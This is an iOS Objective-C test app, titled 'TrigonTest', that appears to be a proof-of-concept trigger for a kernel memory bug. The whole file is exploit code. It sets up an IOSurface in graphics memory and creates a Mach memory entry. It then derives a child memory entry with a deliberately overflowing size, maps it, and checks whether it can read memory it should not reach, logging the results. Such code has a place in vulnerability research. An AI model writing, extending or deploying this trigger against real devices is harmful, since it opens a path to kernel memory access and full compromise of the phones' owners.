#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <mach/mach.h>
#import <mach/vm_map.h>
#import <string.h>
#import <stdlib.h>
static NSMutableString *gLog; static NSString *gPath;
static void L(NSString *fmt,...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[tg] %@",s);}
static uint64_t rd64(const void*p){uint64_t v;memcpy(&v,p,8);return v;}
static void run(void){
 NSDictionary*d=@{@"IOSurfaceAllocSize":@0x10000,@"IOSurfaceMemoryRegion":@"PurpleGfxMem"};
 IOSurfaceRef s=IOSurfaceCreate((__bridge CFDictionaryRef)d);L(@"[surface] %p",s);if(!s)return;
 void*base=IOSurfaceGetBaseAddress(s);size_t al=IOSurfaceGetAllocSize(s);L(@"[surface] base=%p alloc=0x%zx",base,al);if(!base||al<0x10000){CFRelease(s);return;}
 uint64_t*pg=(uint64_t*)base; for(int i=0;i<0x2000;i++)pg[i]=0x545249474F4E0000ULL|i;
 mach_port_t parent=MACH_PORT_NULL; memory_object_size_t psz=al;
 kern_return_t kr=mach_make_memory_entry_64(mach_task_self(),&psz,(mach_vm_address_t)(uintptr_t)base,VM_PROT_DEFAULT,&parent,MACH_PORT_NULL);
 L(@"[parent] kr=0x%x size=0x%llx port=0x%x",kr,(unsigned long long)psz,parent);
 if(kr){CFRelease(s);return;}
 mach_port_t child=MACH_PORT_NULL; memory_object_size_t csz=0xFFFFFFFFFFFFC000ULL; memory_object_offset_t off=0x8000;
 kr=mach_make_memory_entry_64(mach_task_self(),&csz,off,VM_PROT_DEFAULT,&child,parent);
 L(@"[child] kr=0x%x size=0x%llx port=0x%x",kr,(unsigned long long)csz,child);
 if(!kr){
  mach_vm_address_t at=0; mach_vm_size_t ms=0x4000;
  kr=mach_vm_map(mach_task_self(),&at,ms,0,VM_FLAGS_ANYWHERE,child,0,0,VM_PROT_DEFAULT,VM_PROT_DEFAULT,VM_INHERIT_NONE);
  L(@"[map off0] kr=0x%x at=0x%llx",kr,(unsigned long long)at);
  if(!kr){L(@"[map off0] q0=0x%llx q1=0x%llx expect=0x%llx",(unsigned long long)rd64((void*)at),(unsigned long long)rd64((void*)(at+8)),(unsigned long long)pg[0x8000/8]);mach_vm_deallocate(mach_task_self(),at,ms);}
  mach_port_deallocate(mach_task_self(),child);
 }
 mach_port_deallocate(mach_task_self(),parent);CFRelease(s);L(@"=== done ===");
}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{
 self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;
 UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"TrigonTest\n";
 [vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH,0),^{NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];gPath=[docs stringByAppendingPathComponent:@"tg.log"];gLog=[NSMutableString new];run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});
 return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
